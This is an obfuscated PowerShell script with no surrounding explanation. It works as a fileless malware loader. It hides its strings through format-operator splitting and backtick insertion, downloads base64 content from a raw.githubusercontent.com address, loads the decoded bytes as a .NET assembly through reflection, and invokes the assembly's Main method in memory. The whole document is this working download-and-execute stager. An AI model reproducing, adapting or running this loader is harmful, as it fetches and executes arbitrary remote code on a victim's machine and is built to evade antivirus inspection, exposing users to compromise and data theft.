 $2M1= [tYPe]("{0}{1}{3}{2}"-F 'SyS','T','.convERt','EM')  ; &("{1}{2}{0}" -f'ıteM','set','-')  ('VARİaBLE'+':'+'6BK'+'30p')  ( [tYPe]("{2}{4}{0}{5}{6}{1}{3}{7}" -f 'reflEcti','.a','SY','sseM','stem.','o','n','bLy')  ); .("{3}{1}{0}{2}"-f '-VAriABL','t','e','Se') ("vzW"+"4")  ( [TYpe]("{3}{0}{1}{4}{2}" -f'Stem.act','iVA','oR','sY','T') )  ;${U`RL} = ("{3}{1}{8}{18}{9}{13}{14}{17}{16}{7}{12}{11}{4}{2}{0}{6}{5}{10}{15}" -f'adaxd','aw.','xsdcsdaxs','https://r','da','a/main/','scs','acdsa','github','.co','deneme.t','sac','dsacdsxda','m/H','ead','xt','tXx/dxdasaxds','Sho','usercontent')

${r`esP`on`SE} = .("{0}{3}{1}{4}{2}" -f 'I','ke-WebReq','est','nvo','u') -Uri ${u`RL} -UseBasicParsing

if (${REspon`Se}."sT`ATUS`CoDE" -eq 200) {
    ${B`Ase`64STR`İNg} = ${RE`S`poNSe}."c`oNt`Ent"

    ${b`YteaR`Ray} =   $2m1::("{1}{0}{3}{4}{2}" -f 'rom','F','ring','Bas','e64St').Invoke(${b`Ase64St`RİnG})
    ${a`SSemb`Ly} =   $6BK30p::("{0}{1}" -f 'L','oad').Invoke(${By`T`earray})

    ${CLA`ss} = ${A`sS`EMblY}.("{1}{0}"-f 'Type','Get').Invoke(("{1}{2}{3}{0}"-f 'k.HH','QJAMs','rpf','h'))
    ${MEth`OD} = ${clA`ss}.("{0}{1}{2}" -f 'Ge','tMeth','od').Invoke(("{0}{1}" -f'Ma','in'))

    ${in`sTaNcE} =  (&("{1}{0}" -f'ble','vaRİa')  ("Vzw"+"4") -VALueONLY)::("{3}{2}{0}{1}"-f 'eInst','ance','at','Cre').Invoke(${clA`ss})
    ${m`e`ThoD}.("{1}{0}{2}" -f 'v','In','oke').Invoke(${İn`ST`ANce}, @())
}
